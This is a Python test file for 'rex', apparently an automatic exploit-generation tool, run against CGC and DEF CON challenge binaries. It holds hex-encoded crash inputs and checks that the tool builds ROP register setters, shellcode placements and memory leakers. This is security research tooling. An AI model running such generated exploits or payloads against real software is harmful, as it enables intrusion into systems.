import rex
import nose
import struct
from rex.vulnerability import Vulnerability

import os
bin_location = str(os.path.join(os.path.dirname(os.path.realpath(__file__)), '../../binaries-private'))

CGC_HEADER = "7f43 4743 0101 0143 014d 6572 696e 6f00".replace(" ", "").decode('hex')

import logging
logging.getLogger("rex").setLevel("DEBUG")


def test_legit_00001():
    '''
    Test exploitation of legit_00001 given a good crash.
    '''

    crash = '1002000041414141414141414141414d41414141414141414141414141414141001041414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141412a4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141604141414141414141414102ffffff410080ffff4141410d807f412641414141414141414141414141414141414141413b41415f414141412b41414141417f4141414141412441414141416041f8414141414141c1414139410010000200005541415f4141b9b9b9b1b9d4b9b9b9b99cb99ec4b9b9b941411f4141414141414114414141514141414141414141414141454141494141414141414141404141414141414d414124a0414571717171717171717171717171717171616161616161616161616161616161006161515e41414141412041414141412125414141304141492f41414141492f4141414541412c4141410037373737373737373737414141414141413a41c4b9b9b9b901b9413c41414141414141414141414141412133414141414141412f414141414141414164414141414141414141414141417f41414100010000000055414b4100124141414141414141'.decode('hex')

    crash = rex.Crash(os.path.join(bin_location, "defcon24/legit_00001"), crash)

    arsenal = crash.exploit()

    nose.tools.assert_true(len(arsenal.register_setters) >= 8)
    nose.tools.assert_true(len(arsenal.leakers) >= 1)

    for reg in arsenal.register_setters:
        results = [ ]
        for _ in range(5):
            results.append(arsenal.register_setters[reg].test_binary())
        nose.tools.assert_true(any(results))

    for leaker in arsenal.leakers:
        nose.tools.assert_true(leaker.test_binary())

def test_legit_00003():
    '''
    Test exploration and exploitation fo legit_00003.
    '''

    crash = "1\n" + "A" * 200
    crash = rex.Crash(os.path.join(bin_location, "defcon24/legit_00003"), crash)

    nose.tools.assert_true(crash.explorable())
    nose.tools.assert_equals(crash.crash_type, Vulnerability.WRITE_WHAT_WHERE)

    crash.explore()

    arsenal = crash.exploit()

    nose.tools.assert_true(len(arsenal.register_setters) >= 8)
    nose.tools.assert_true(len(arsenal.leakers) >= 1)

    for reg in arsenal.register_setters:
        results = [ ]
        for _ in range(5):
            results.append(arsenal.register_setters[reg].test_binary())
        nose.tools.assert_true(any(results))

    for leaker in arsenal.leakers:
        nose.tools.assert_true(leaker.test_binary())

def test_shellcode_placement():
    '''
    Test that shellcode is placed in only executable memory regions.
    '''

    crash = "A" * 272
    crash = rex.Crash(os.path.join(bin_location, "tests/i386/shellcode_tester"), crash)

    arsenal = crash.exploit()

    exploit = arsenal.register_setters['eax']

    # make sure the shellcode was placed into the executable heap page
    heap_top = crash.state.se.any_int(crash.state.cgc.allocation_base)
    nose.tools.assert_equal(struct.unpack("<I", exploit._raw_payload[-4:])[0] & 0xfffff000, heap_top)

    exec_regions = filter(lambda a: crash.state.se.any_int(crash.state.memory.permissions(a)) & 0x4, crash.symbolic_mem)

    # should just be two executable regions
    nose.tools.assert_equal(len(exec_regions), 2)

    # only executable regions should be that one heap page and the stack, despite having more heap control and global control
    nose.tools.assert_equal(sorted(exec_regions), sorted([0xb7ffb000, 0xbaaaaeec]))

def test_cpp_vptr_smash():
    '''
    Test detection of 'arbitrary-read' vulnerability type, exploration of the crash, and exploitation post-exploration
    '''

    crash = "A" * 512
    crash = rex.Crash(os.path.join(bin_location, "tests/i386/vuln_vptr_smash"), crash)

    # this should just tell us that we have an arbitrary-read and that the crash type is explorable
    # but not exploitable
    nose.tools.assert_equal(crash.crash_type, Vulnerability.ARBITRARY_READ)
    nose.tools.assert_false(crash.exploitable())
    nose.tools.assert_true(crash.explorable())

    crash.explore()
    # after exploring the crash we should see that it is exploitable
    nose.tools.assert_true(crash.exploitable)
    nose.tools.assert_true(crash.state.se.symbolic(crash.state.regs.pc))

    # let's generate some exploits for it
    arsenal = crash.exploit()

    # make sure we have control over these
    nose.tools.assert_true(arsenal.can_control('eax'))
    nose.tools.assert_true(arsenal.can_control('ebp'))
    nose.tools.assert_true(arsenal.can_control('ebx'))
    nose.tools.assert_true(arsenal.can_control('ecx'))
    nose.tools.assert_true(arsenal.can_control('edi'))
    nose.tools.assert_true(arsenal.can_control('edx'))
    nose.tools.assert_true(arsenal.can_control('esi'))
    nose.tools.assert_true(arsenal.can_control('esp'))

    # make sure we can also generate some leakers, should be rop and shellcode at this point
    nose.tools.assert_true(len(arsenal.leakers) >= 2)

    # make sure our ecx chain actually works (ecx is chosen arbitrarily)
    ecx_exploit = arsenal.register_setters['ecx']

    c_str = ecx_exploit._chain.payload_str(constraints=(ecx_exploit._value_var == 0x50495a41))
    c_bvv = ecx_exploit.crash.state.se.BVV(c_str)

    c_mem = ecx_exploit.crash.state.memory.load(ecx_exploit._chain_addr, len(c_str))
    ecx_exploit.crash.state.add_constraints(c_mem == c_bvv)

    exploited_state = ecx_exploit._windup_state(ecx_exploit.crash.state)

    # make sure there is only one possibility for ecx at this point
    exploited_ecx_vals = exploited_state.se.any_n_str(exploited_state.regs.ecx, 2)
    nose.tools.assert_true(len(exploited_ecx_vals) == 1)

    ecx_val = exploited_ecx_vals[0]
    nose.tools.assert_equal(ecx_val, "PIZA")

    # make sure our leaker exploits writes out the contents
    leaker_exploit = arsenal.best_type2

    # leak the memory at the binary's base address
    c_str = leaker_exploit._chain.payload_str(constraints=(leaker_exploit._addr_var == 0x8048000,
                                                           leaker_exploit._size_var == 0x1000))
    c_bvv = leaker_exploit.crash.state.se.BVV(c_str)

    c_mem = leaker_exploit.crash.state.memory.load(leaker_exploit._chain_addr, len(c_str))
    leaker_exploit.crash.state.add_constraints(c_mem == c_bvv)

    exploited_state = leaker_exploit._windup_state(leaker_exploit.crash.state, to_syscall=True)
    exploited_state.add_constraints(exploited_state.regs.eax == 2)
    exploited_state.add_constraints(exploited_state.regs.ebx == 1)
    exploited_state.add_constraints(exploited_state.regs.ecx == 0x8048000)
    exploited_state.add_constraints(exploited_state.regs.edx == 0x1000)
    exploited_state.add_constraints(exploited_state.regs.esi == 0)

    ss = leaker_exploit._windup_state(exploited_state)

    leaked = ss.posix.dumps(1)
    leak_start = leaked.find("\x7fCGC")
    leaked_header = leaked[leak_start:leak_start+0x10]
    nose.tools.assert_equals(leaked_header, CGC_HEADER)

    # make sure the test succeeds on every register setter
    for reg in arsenal.register_setters:
        nose.tools.assert_true(arsenal.register_setters[reg].test_binary())

    # make sure the test succeeds on every leaker
    for leaker in arsenal.leakers:
        nose.tools.assert_true(leaker.test_binary())

def test_linux_stacksmash():
    '''
    Test exploiting a simple linux program with a stack buffer overflow. We should be able to exploit the test binary by
    ropping to 'system', calling shellcode in the BSS and calling 'jmpsp' shellcode in the BSS.
    '''

    crash = "A" * 227
    crash = rex.Crash(os.path.join(bin_location, "tests/i386/vuln_stacksmash"), crash)
    exploit = crash.exploit()

    # make sure we're able to exploit it in all possible ways
    nose.tools.assert_equal(len(exploit.arsenal), 3)
    nose.tools.assert_true('rop_to_system' in exploit.arsenal)
    nose.tools.assert_true('call_shellcode' in exploit.arsenal)
    nose.tools.assert_true('call_jmp_sp_shellcode' in exploit.arsenal)

    # TODO test exploit with pwntool's 'process'

def test_cgc_type1_rop_stacksmash():
    '''
    Test creation of type1 exploit on 0b32aa01_01 ('Palindrome') with rop. The vulnerability exposed by the string `crash` is
    stack buffer overflow. This testcase should exercise rex exploiting stack-based buffer overflows with rop.
    '''

    crash = "0500ffff80ffffff80f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1ffff80f1f1f1ebf1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f100de7fff80ffffff800fffffff7ef3ffffffff7fffff80fffffeff09fefefefefe0a57656c63fe6d6520746f2850616c696e64726f6d65204669776465720a0affffffff80ffffe8800fffffff7f230a"

    crash = rex.Crash(os.path.join(bin_location, "cgc_scored_event_1/cgc/0b32aa01_01"), crash.decode('hex'))
    exploit = crash.exploit()

    # make sure we can control ecx, edx, ebx, ebp, esi, and edi with rop
    nose.tools.assert_true(exploit.can_control('ecx'))
    nose.tools.assert_true(exploit.can_control('edx'))
    nose.tools.assert_true(exploit.can_control('ebx'))
    nose.tools.assert_true(exploit.can_control('ebp'))
    nose.tools.assert_true(exploit.can_control('esi'))
    nose.tools.assert_true(exploit.can_control('edi'))
    nose.tools.assert_true(exploit.can_control('eax'))
    nose.tools.assert_true(exploit.can_control('esp'))

    # make sure our ecx chain actually works (ecx is chosen arbitrarily)
    ecx_exploit = exploit.register_setters['ecx']

    c_str = ecx_exploit._chain.payload_str(constraints=(ecx_exploit._value_var==0x50495a41))
    c_bvv = ecx_exploit.crash.state.se.BVV(c_str)

    c_mem = ecx_exploit.crash.state.memory.load(ecx_exploit._chain_addr, len(c_str))
    ecx_exploit.crash.state.add_constraints(c_mem == c_bvv)

    exploited_state = ecx_exploit._windup_state(ecx_exploit.crash.state)

    # make sure there is only one possibility for ecx at this point
    exploited_ecx_vals = exploited_state.se.any_n_str(exploited_state.regs.ecx, 2)
    nose.tools.assert_true(len(exploited_ecx_vals) == 1)

    ecx_val = exploited_ecx_vals[0]
    nose.tools.assert_equal(ecx_val, "PIZA")

    # TODO test circumstantial and shellcode setters

    # make sure our leaker exploits writes out the contents
    leaker_exploit = exploit.best_type2

    # leak the memory at the binary's base address
    c_str = leaker_exploit._chain.payload_str(constraints=(leaker_exploit._addr_var == 0x8048000,
                                                           leaker_exploit._size_var == 0x1000))
    c_bvv = leaker_exploit.crash.state.se.BVV(c_str)

    c_mem = leaker_exploit.crash.state.memory.load(leaker_exploit._chain_addr, len(c_str))
    leaker_exploit.crash.state.add_constraints(c_mem == c_bvv)

    exploited_state = leaker_exploit._windup_state(leaker_exploit.crash.state, to_syscall=True)
    exploited_state.add_constraints(exploited_state.regs.eax == 2)
    exploited_state.add_constraints(exploited_state.regs.ebx == 1)
    exploited_state.add_constraints(exploited_state.regs.ecx == 0x8048000)
    exploited_state.add_constraints(exploited_state.regs.edx == 0x1000)
    exploited_state.add_constraints(exploited_state.regs.esi == 0)

    ss = leaker_exploit._windup_state(exploited_state)

    leaked = ss.posix.dumps(1)
    leak_start = leaked.find("\x7fCGC")
    leaked_header = leaked[leak_start:leak_start+0x10]
    nose.tools.assert_equals(leaked_header, CGC_HEADER)

    # make sure the test succeeds on every register setter
    for reg in exploit.register_setters:
        nose.tools.assert_true(exploit.register_setters[reg].test_binary())

    # make sure the test succeeds on every leaker
    for leaker in exploit.leakers:
        nose.tools.assert_true(leaker.test_binary())

def test_quick_triage():
    '''
    Test our ability to triage crashes quickly.
    '''

    crash_tuples = [
            ("1002000041414141414141414141414d41414141414141414141414141414141001041414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141412a4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141604141414141414141414102ffffff410080ffff4141410d807f412641414141414141414141414141414141414141413b41415f414141412b41414141417f4141414141412441414141416041f8414141414141c1414139410010000200005541415f4141b9b9b9b1b9d4b9b9b9b99cb99ec4b9b9b941411f4141414141414114414141514141414141414141414141454141494141414141414141404141414141414d414124a0414571717171717171717171717171717171616161616161616161616161616161006161515e41414141412041414141412125414141304141492f41414141492f4141414541412c4141410037373737373737373737414141414141413a41c4b9b9b9b901b9413c41414141414141414141414141412133414141414141412f414141414141414164414141414141414141414141417f41414100010000000055414b4100124141414141414141".decode('hex'), "defcon24/legit_00001", Vulnerability.IP_OVERWRITE),
            ("1\n" + "A" * 200, "defcon24/legit_00003", Vulnerability.WRITE_WHAT_WHERE),
            ("0500ffff80ffffff80f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1ffff80f1f1f1ebf1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f100de7fff80ffffff800fffffff7ef3ffffffff7fffff80fffffeff09fefefefefe0a57656c63fe6d6520746f2850616c696e64726f6d65204669776465720a0affffffff80ffffe8800fffffff7f230a".decode('hex'), "cgc_scored_event_1/cgc/0b32aa01_01", Vulnerability.IP_OVERWRITE),
            ("A" * 512, "tests/i386/vuln_vptr_smash", Vulnerability.ARBITRARY_READ),
            ("00ea01ffe7fffffffbe3c0d9d9d9d9d9d9d9d9e6e6e6000000e90beae9e9e9e9e9e9d9e6e6e6000000e9e9e9e9e90000f320e9e9e9e9e9e9e900008000e3e3e3e3e3e3e3e3e3e3e3e3e3d8e3e3e3e3e3d2e3e3e3e3e3e3e9e9e9e97fffe9e9e9e9e9e9f1e9e9e9f6e9e9e9e9e9e9e9e9ebe9e9e9e9e9e9e9e9e9e9e9ffff8080e990e9e9ece9e9e9e9e9e9e9e9e9e9e90000ff20e9e9e9e9e9e9e900008000e3e3e3e3e3e3e3e3e3e3e3e3e3e3dde3e3e3e3e3e3e3e3e3e3e3e9e9e9f27fffe9a9e9e9e9e9f1e9e9e9e9e9e9e9e9e9e9e9e9ebe9e9e9e90080e9e91001e9e9e90000d9d9d9d9d9d9d9d9c2d9dae60200".decode('hex'), "cgc_qualifier_event/cgc/474a5e01_01", Vulnerability.NULL_DEREFERENCE),
    ]

    for tup in crash_tuples:
        crash_input = tup[0]
        binary_path = os.path.join(bin_location, tup[1])
        expected_tp = tup[2]

        nose.tools.assert_true(rex.Crash.quick_triage(binary_path, crash_input) == expected_tp)

def run_all():
    functions = globals()
    all_functions = dict(filter((lambda (k, v): k.startswith('test_')), functions.items()))
    for f in sorted(all_functions.keys()):
        if hasattr(all_functions[f], '__call__'):
            all_functions[f]()

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        globals()['test_' + sys.argv[1]]()
    else:
        run_all()
